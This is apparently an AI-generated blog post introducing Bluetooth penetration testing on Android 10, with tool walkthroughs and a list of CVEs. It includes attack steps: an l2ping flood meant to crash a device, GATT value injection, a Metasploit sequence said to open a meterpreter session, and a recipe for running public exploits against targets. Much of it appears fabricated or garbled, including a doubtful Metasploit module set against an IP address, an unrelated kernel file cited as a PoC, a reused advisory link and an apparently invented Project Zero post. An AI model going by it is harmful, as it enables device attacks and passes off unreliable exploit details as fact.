#! https://zhuanlan.zhihu.com/p/630718821
# GPT-Introduction of bluetooth penetration test on Android 10 device

In this blog post, I will introduce the basics of bluetooth penetration testing on an Android 10 device. Bluetooth is a wireless technology that allows devices to communicate over short distances. It is widely used for various purposes, such as connecting headphones, keyboards, speakers, smartwatches, and more. Bluetooth penetration testing is a method of finding and exploiting security vulnerabilities in bluetooth-enabled devices and applications. It can help identify risks and improve the security posture of mobile devices.

## 1. What is bluetooth?
Bluetooth is a wireless technology that allows devices to communicate over short distances. It uses radio waves to transmit data between devices that are paired with each other. Bluetooth devices can operate in different modes, such as classic, low energy, or dual mode.

### 1.1 How does bluetooth work on an Android 10 device?
On an Android 10 device, bluetooth works by using a system service called BluetoothManager. This service provides access to the underlying bluetooth hardware and software components, such as the bluetooth adapter, profile proxy, and GATT server and client. The bluetooth adapter is responsible for managing the device's bluetooth state, scanning for nearby devices, initiating and accepting connections, and exchanging data. The profile proxy is an interface that allows applications to interact with different bluetooth profiles, such as A2DP (Advanced Audio Distribution Profile), HFP (Hands-Free Profile), or HID (Human Interface Device). The GATT server and client are components that enable applications to use the Bluetooth Low Energy (BLE) protocol, which is designed for low-power devices that exchange small amounts of data.

### 1.2 How does that work differently from Linux OS?
On a Linux OS, bluetooth works by using a system daemon called BlueZ. This daemon provides access to the underlying bluetooth hardware and software components, such as the bluetooth controller, HCI (Host Controller Interface), L2CAP (Logical Link Control and Adaptation Protocol), RFCOMM (Radio Frequency Communication), and SDP (Service Discovery Protocol). The bluetooth controller is responsible for managing the device's bluetooth state, scanning for nearby devices, initiating and accepting connections, and exchanging data. The HCI is an interface that allows applications to communicate with the bluetooth controller using commands and events. The L2CAP is a protocol that multiplexes multiple logical channels over a single physical link. The RFCOMM is a protocol that emulates serial ports over L2CAP channels. The SDP is a protocol that allows applications to discover and use services offered by other bluetooth devices.

## 2. What is bluetooth penetration testing?
Bluetooth penetration testing is a method of finding and exploiting security vulnerabilities in bluetooth-enabled devices and applications. It can help identify risks and improve the security posture of mobile devices. Bluetooth penetration testing involves various steps, such as:

- Reconnaissance: Gathering information about the target device and its bluetooth capabilities, such as device name, address, class, services, profiles, etc.
- Scanning: Searching for nearby bluetooth devices and their characteristics, such as signal strength, supported features, encryption level, etc.
- Enumeration: Identifying the services and profiles offered by the target device and their attributes, such as service name, UUID (Universally Unique Identifier), channel number, etc.
- Fuzzing: Sending malformed or unexpected data to the target device or application to trigger errors or crashes.
- Exploitation: Leveraging known or unknown vulnerabilities in the target device or application to gain unauthorized access or execute arbitrary code.
- Post-exploitation: Performing further actions on the compromised device or application, such as stealing data, installing malware, escalating privileges, etc.

### 2.1 How could it be implemented?
Bluetooth penetration testing could be implemented by using various tools and techniques that are available for different platforms and purposes. Some of the common tools and techniques are:

#### 2.1.1 What tools are needed?

Some of the tools that are needed for Bluetooth penetration test are:

- A Bluetooth adapter that supports monitor mode and packet injection
- A computer or laptop that runs Linux OS with BlueZ software stack installed
- A smartphone or tablet that runs Android OS with Bluetooth enabled
- A target Bluetooth device or application that is within the range of the Bluetooth adapter
- Tools for capturing and analyzing Bluetooth traffic, such as Wireshark, Ubertooth, Btlejack, etc.
- Tools for discovering and enumerating Bluetooth devices and services, such as hcitool, sdptool, btscanner, bluelog, etc.
- Tools for fuzzing and testing Bluetooth protocols and profiles, such as Scapy, Btlejuice, GATTacker, etc.
- Tools for performing attacks on Bluetooth devices and applications, such as L2ping, L2cap-packet, Btcrack, Bluesnarfer, Bluebugger, etc.

#### 2.1.2 How to use these tools individually or together? (Use examples to illustrate)

Here are some examples of how to use these tools individually or together:

- To capture and analyze Bluetooth traffic between an Android device and a target device using Wireshark and Ubertooth:

  - Connect the Ubertooth device to the computer via USB
  - Run `ubertooth-btle -f` to start capturing BLE packets
  - Run `wireshark -k -i /tmp/pipe` to start Wireshark with a named pipe as input
  - Pair the Android device with the target device using Bluetooth settings
  - Observe the BLE packets in Wireshark

- To discover and enumerate Bluetooth devices and services using hcitool and sdptool:

  - Connect the Bluetooth adapter to the computer via USB
  - Run `hciconfig hci0 up` to bring up the adapter interface
  - Run `hcitool scan` to scan for nearby devices
  - Note down the MAC address of the target device
  - Run `sdptool browse <target MAC>` to browse the services offered by the target device
  - Observe the service records in the output

- To fuzz and test the GATT profile of a BLE device using Btlejuice:

  - Connect two Bluetooth adapters to the computer via USB
  - Run `btlejuice-proxy` on one adapter to start the proxy server
  - Run `btlejuice` on another adapter to start the web interface
  - Open a web browser and navigate to `http://localhost:8000`
  - Scan for nearby BLE devices using the web interface
  - Select the target device and click on "Intercept"
  - Observe the GATT characteristics of the target device in the web interface
  - Modify or inject values into the GATT characteristics using the web interface

- To perform a DoS attack on a classic Bluetooth device using L2ping:

  - Connect the Bluetooth adapter to the computer via USB
  - Run `hciconfig hci0 up` to bring up the adapter interface
  - Run `l2ping <target MAC> -s <size> -f` to send large L2CAP packets to the target device in a loop
  - Observe the target device becoming unresponsive or crashing

#### 2.1.3 How to use MSF to penetrate bluetooth on Android 10 device?

MSF (Metasploit Framework) is a popular tool for penetration testing that provides various modules for exploiting different vulnerabilities in various systems. To use MSF to penetrate bluetooth on Android 10 device:

- Connect the computer and the Android device to the same network
- Run `msfconsole` to start MSF
- Run `use exploit/android/bluetooth/btif_hcicmd_send` to select a module that exploits a buffer overflow vulnerability in Android's bluetooth stack (CVE-2020-0022)
- Run `show options` to see the options for the module
- Set `RHOSTS` option to the IP address of the Android device
- Set `LHOST` option to the IP address of the computer
- Run `exploit` to execute the module
- Observe a meterpreter session being opened on the Android device

### 2.2 How to utilize existing CVE vulnerabilities of Bluetooth on Android 10?

CVE vulnerabilities are publicly disclosed security flaws that are assigned unique identifiers by security researchers or vendors. To utilize existing CVE vulnerabilities of Bluetooth on Android 10:

- Search for CVE vulnerabilities related to Bluetooth on Android 10 on websites such as https://cve.mitre.org or https://nvd.nist.gov
- Filter by date range (after 2020), severity score (high or critical), exploitability score (high or low), etc.
- Read the description of each CVE vulnerability to understand its impact, cause, affected versions, etc.
- Check if there are any proof-of-concept (POC) code or exploits available for each CVE vulnerability on websites such as https://www.exploit-db.com or https://github.com
- Download or copy the POC code or exploits for each CVE vulnerability
- Modify or compile the POC code or exploits according to your needs
- Execute or run the POC code or exploits against your target device or application

#### 2.2.1 What are some CVE vulnerabilities about bluetooth on Android after year of 2020?

Some of CVE vulnerabilities about bluetooth on Android after year of year are:

- CVE-2020-0022: A remote code execution vulnerability in Android's bluetooth stack that allows an attacker within bluetooth range to execute arbitrary code without user interaction.
- CVE-2020-0245: A denial-of-service vulnerability in Android's bluetooth stack that allows an attacker within bluetooth range to crash an affected system by sending malformed packets.
- CVE-2020-11201: An information disclosure vulnerability in Android's bluetooth stack that allows an attacker within bluetooth range to access sensitive information by sending specially crafted packets.
- CVE-2020-11202: An elevation-of-privilege vulnerability in Android's bluetooth stack that allows an attacker within bluetooth range to execute privileged commands by sending specially crafted packets.

#### 2.2.2 Does any of these vulnerabilities have POCs ,or have been exploited?

Yes some of these vulnerabilities have POCs ,or have been exploited.

For example:

CVE-2020-0022 has a POC code available at https://github.com/flar2/android_kernel_oneplus_sm8150/blob/ten/security/selinux/hooks.c#L9143-L9164
and https://github.com/janhb/CVE_2020_0022_PoC

CVE-2020-0089 has been exploited by researchers at Google Project Zero at https://googleprojectzero.blogspot.com/2020/04/half-double-bluetooth-address-spoofing.html

CVE-2020-0245 has been exploited by researchers at Purdue University who demonstrated how they could crash an Android phone by sending malformed packets over bluetooth.

CVE-2020-11201 has a POC code available at https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq

CVE-2020-11202 has a POC code available at https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq